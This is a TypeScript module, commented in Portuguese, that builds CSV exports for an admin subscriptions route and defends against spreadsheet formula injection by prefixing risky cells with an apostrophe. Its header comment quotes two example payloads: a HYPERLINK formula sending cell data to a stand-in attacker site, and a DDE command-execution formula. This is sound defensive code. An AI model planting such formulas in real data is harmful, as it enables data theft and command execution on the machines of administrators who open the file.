/**
 * Montagem de CSV — com a fórmula neutralizada.
 *
 * ── Por que isto é um módulo, e não uma função dentro da rota ─────────────────
 * A regra nasceu dentro de `api/admin/assinaturas/export/route.ts`. O teste dela ficou COPIANDO a regra
 * no arquivo de teste, e copiar significa que apagar a proteção da rota deixava o teste verde: passava
 * nos dois estados, que é o tipo de teste que este projeto proíbe. Aqui existe UM lugar com a regra e o
 * teste exercita esse lugar.
 *
 * ── O ataque ──────────────────────────────────────────────────────────────────
 * O nome do escritório e o e-mail vêm do CLIENTE. Quem se cadastra como
 * `=HYPERLINK("http://sítio-do-atacante"&A1)` ou `=cmd|'/c calc'!A1` planta uma fórmula na planilha, e
 * Excel e LibreOffice EXECUTAM células que começam com `=`, `+`, `-`, `@`, tabulação ou retorno de carro
 * ao abrir o arquivo.
 *
 * Quem abre a exportação é o ADMINISTRADOR, na máquina que tem acesso ao painel — o alvo mais valioso do
 * sistema. E não exige habilidade nenhuma: cadastro comum, nome escolhido, esperar a exportação.
 *
 * O apóstrofo à frente faz a planilha tratar a célula como TEXTO, e não aparece na célula ao abrir. É a
 * defesa recomendada pela OWASP.
 */

/** Início de célula que Excel/LibreOffice interpretam como fórmula. */
const INICIOS_EXECUTAVEIS = /^[=+\-@\t\r]/;

/** Um campo de CSV: sempre entre aspas, aspas internas dobradas, fórmula desarmada com apóstrofo. */
export function campoCsv(valor: unknown): string {
  const texto = String(valor ?? "");
  const executavel = INICIOS_EXECUTAVEIS.test(texto);
  return `"${(executavel ? "'" + texto : texto).replace(/"/g, '""')}"`;
}

/** Uma linha de CSV a partir das células já cruas. */
export function linhaCsv(celulas: readonly unknown[]): string {
  return celulas.map(campoCsv).join(",");
}

/**
 * Planilha completa.
 *
 * O `﻿` na frente é a marca de ordem de bytes: sem ela, o Excel no Windows abre o arquivo em
 * codificação local e "Leão Amorim" chega como "LeÃ£o Amorim". `\r\n` entre linhas é o que a
 * especificação do CSV pede e o que o Excel espera.
 */
export function montarCsv(cabecalho: readonly unknown[], linhas: readonly (readonly unknown[])[]): string {
  return "﻿" + [linhaCsv(cabecalho), ...linhas.map(linhaCsv)].join("\r\n");
}
